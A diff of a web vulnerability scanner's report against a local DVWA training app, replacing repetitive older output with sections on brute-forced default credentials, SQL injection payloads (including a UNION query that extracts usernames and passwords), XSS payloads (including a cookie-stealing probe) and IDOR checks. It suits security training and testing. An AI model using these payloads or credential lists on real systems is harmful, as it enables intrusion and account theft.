@@ -1,135 +1,63 @@
-===== SQL Injection Scan Results =====
-===== SQL Injection Scan Results =====
-===== SQL Injection Scan Results =====
-[SQLi] 1 → Safe
-[SQLi] ' OR '1'='1 → Vulnerable
-[SQLi] ' OR 1=1 -- → Vulnerable
-[SQLi] ' OR 'a'='a → Vulnerable
-[SQLi] 1' OR '1'='1 → Vulnerable
-[SQLi] 1' -- → Vulnerable
-[SQLi] ' UNION SELECT null,null -- → Vulnerable
-[SQLi] ' AND 1=2 -- → Vulnerable
+=============================================
+       WebScanPro Security Report
+=============================================
+Generated: 2026-03-16 18:58:26
+Target:    http://localhost:8080/dvwa
 
-===== XSS Scan Results =====
-[XSS] hello → Reflected
-[XSS] test123 → Reflected
-[XSS] <script>alert(1)</script> → Reflected
-[XSS] <img src=x onerror=alert(1)> → Reflected
-[XSS] "><script>alert(1)</script> → Reflected
-[XSS] <svg/onload=alert(1)> → Reflected
+Brute Force Results
+------------------------------
+[ATTEMPT] admin:admin          -> Failed
+[ATTEMPT] admin:password       -> SUCCESS
+[ATTEMPT] admin:123456         -> Failed
+[ATTEMPT] admin:admin123       -> Failed
+[ATTEMPT] admin:qwerty         -> Failed
+[ATTEMPT] user:user            -> Failed
+[ATTEMPT] user:password        -> Failed
+[ATTEMPT] root:root            -> Failed
+[ATTEMPT] test:test            -> Failed
+[ATTEMPT] guest:guest          -> Failed
 
-===== SQL Injection Scan Results =====
-[SQLi] 1 -> Reflected
-[SQLi] ' OR '1'='1 -> Vulnerable
-[SQLi] ' OR 1=1 -- -> Vulnerable
-[SQLi] ' OR 'a'='a -> Vulnerable
-[SQLi] 1' OR '1'='1 -> Vulnerable
-[SQLi] 1' -- -> Vulnerable
-[SQLi] ' UNION SELECT null,null -- -> Vulnerable
-[SQLi] ' AND 1=2 -- -> Vulnerable
+[VULNERABLE] Weak credentials found: admin:password
+Risk: Account takeover possible with default credentials.
 
-===== XSS Scan Results =====
-[SQLi] hello -> Safe
-[SQLi] test123 -> Safe
-[SQLi] <script>alert(1)</script> -> Safe
-[SQLi] <img src=x onerror=alert(1)> -> Safe
-[SQLi] "><script>alert(1)</script> -> Safe
-[SQLi] <svg/onload=alert(1)> -> Safe
+SQL Injection Results
+------------------------------
+1 -> Vulnerable | Severity: Low
+' OR '1'='1 -> Vulnerable | Severity: Medium
+' OR 1=1 -- -> Vulnerable | Severity: Medium
+admin' -- -> Vulnerable | Severity: Medium
+' UNION SELECT NULL,NULL -- -> Vulnerable | Severity: High
+' UNION SELECT username,password FROM users -- -> Vulnerable | Severity: High
+' AND SLEEP(5) -- -> Vulnerable | Severity: High
+' AND '1'='2 -> Safe | Severity: None
+1 AND 1=1 -> Vulnerable | Severity: Medium
+' OR 'x'='y -> Safe | Severity: None
 
-===== SQL Injection Scan Results =====
-[SQLi] 1 -> Reflected
-[SQLi] ' OR '1'='1 -> Vulnerable
-[SQLi] ' OR 1=1 -- -> Vulnerable
-[SQLi] ' OR 'a'='a -> Vulnerable
-[SQLi] 1' OR '1'='1 -> Vulnerable
-[SQLi] 1' -- -> Vulnerable
-[SQLi] ' UNION SELECT null,null -- -> Vulnerable
-[SQLi] ' AND 1=2 -- -> Vulnerable
+XSS Results
+------------------------------
+hello -> Not Reflected | Severity: None
+test123 -> Not Reflected | Severity: None
+<b>bold</b> -> Reflected | Severity: Low
+<script>alert(1)</script> -> Reflected | Severity: Medium
+<img src=x onerror=alert(1)> -> Reflected | Severity: Medium
+<svg onload=alert(1)> -> Reflected | Severity: Medium
+<body onload=alert(1)> -> Reflected | Severity: Medium
+<script>alert(document.cookie)</script> -> Reflected | Severity: High
+<iframe src="javascript:alert(1)"> -> Reflected | Severity: High
 
-===== XSS Scan Results =====
-===== SQL Injection Scan Results =====
-[SQLi] 1 -> Reflected
-[SQLi] ' OR '1'='1 -> Vulnerable
-[SQLi] ' OR 1=1 -- -> Vulnerable
-[SQLi] ' OR 'a'='a -> Vulnerable
-[SQLi] 1' OR '1'='1 -> Vulnerable
-[SQLi] 1' -- -> Vulnerable
-[SQLi] ' UNION SELECT null,null -- -> Vulnerable
-[SQLi] ' AND 1=2 -- -> Vulnerable
+Privilege Escalation / IDOR Tests
+------------------------------
+id=1 -> Accessible | Severity: Medium
+id=2 -> Accessible | Severity: Medium
+id=3 -> Accessible | Severity: Medium
+id=99 -> Not Found | Severity: Low
+id=999 -> Not Found | Severity: Low
 
-===== XSS Scan Results =====
-[SQLi] hello -> Safe
-[SQLi] test123 -> Safe
-[SQLi] <script>alert(1)</script> -> Safe
-[SQLi] <img src=x onerror=alert(1)> -> Safe
-[SQLi] "><script>alert(1)</script> -> Safe
-[SQLi] <svg/onload=alert(1)> -> Safe
-
-===== SQL Injection Scan Results =====
-[SQLi] 1 -> Reflected
-[SQLi] ' OR '1'='1 -> Vulnerable
-[SQLi] ' OR 1=1 -- -> Vulnerable
-[SQLi] ' OR 'a'='a -> Vulnerable
-[SQLi] 1' OR '1'='1 -> Vulnerable
-[SQLi] 1' -- -> Vulnerable
-[SQLi] ' UNION SELECT null,null -- -> Vulnerable
-[SQLi] ' AND 1=2 -- -> Vulnerable
-
-===== XSS Scan Results =====
-[XSS] hello -> Reflected
-[XSS] test123 -> Reflected
-[XSS] <script>alert(1)</script> -> Reflected
-[XSS] <img src=x onerror=alert(1)> -> Reflected
-[XSS] "><script>alert(1)</script> -> Reflected
-[XSS] <svg/onload=alert(1)> -> Reflected
-===== SQL Injection Scan Results =====
-[SQLi] 1 -> Reflected
-[SQLi] ' OR '1'='1 -> Vulnerable
-[SQLi] ' OR 1=1 -- -> Vulnerable
-[SQLi] ' OR 'a'='a -> Vulnerable
-[SQLi] 1' OR '1'='1 -> Vulnerable
-[SQLi] 1' -- -> Vulnerable
-[SQLi] ' UNION SELECT null,null -- -> Vulnerable
-[SQLi] ' AND 1=2 -- -> Vulnerable
-
-===== XSS Scan Results =====
-[XSS] hello -> Reflected
-[XSS] test123 -> Reflected
-[XSS] <script>alert(1)</script> -> Reflected
-[XSS] <img src=x onerror=alert(1)> -> Reflected
-[XSS] "><script>alert(1)</script> -> Reflected
-[XSS] <svg/onload=alert(1)> -> Reflected
-===== SQL Injection Scan Results =====
-[SQLi] 1 -> Reflected
-[SQLi] ' OR '1'='1 -> Vulnerable
-[SQLi] ' OR 1=1 -- -> Vulnerable
-[SQLi] ' OR 'a'='a -> Vulnerable
-[SQLi] 1' OR '1'='1 -> Vulnerable
-[SQLi] 1' -- -> Vulnerable
-[SQLi] ' UNION SELECT null,null -- -> Vulnerable
-[SQLi] ' AND 1=2 -- -> Vulnerable
-
-===== XSS Scan Results =====
-[XSS] hello -> Reflected
-[XSS] test123 -> Reflected
-[XSS] <script>alert(1)</script> -> Reflected
-[XSS] <img src=x onerror=alert(1)> -> Reflected
-[XSS] "><script>alert(1)</script> -> Reflected
-[XSS] <svg/onload=alert(1)> -> Reflected
-===== SQL Injection Scan Results =====
-[SQLi] 1 -> Reflected
-[SQLi] ' OR '1'='1 -> Vulnerable
-[SQLi] ' OR 1=1 -- -> Vulnerable
-[SQLi] ' OR 'a'='a -> Vulnerable
-[SQLi] 1' OR '1'='1 -> Vulnerable
-[SQLi] 1' -- -> Vulnerable
-[SQLi] ' UNION SELECT null,null -- -> Vulnerable
-[SQLi] ' AND 1=2 -- -> Vulnerable
-
-===== XSS Scan Results =====
-[XSS] hello -> Reflected
-[XSS] test123 -> Reflected
-[XSS] <script>alert(1)</script> -> Reflected
-[XSS] <img src=x onerror=alert(1)> -> Reflected
-[XSS] "><script>alert(1)</script> -> Reflected
-[XSS] <svg/onload=alert(1)> -> Reflected
+=============================================
+Summary
+------------------------------
+SQL Injection : 8 vulnerable payload(s)
+XSS           : 7 reflected payload(s)
+Brute Force   : Credential found
+IDOR          : 3 accessible ID(s)
+=============================================
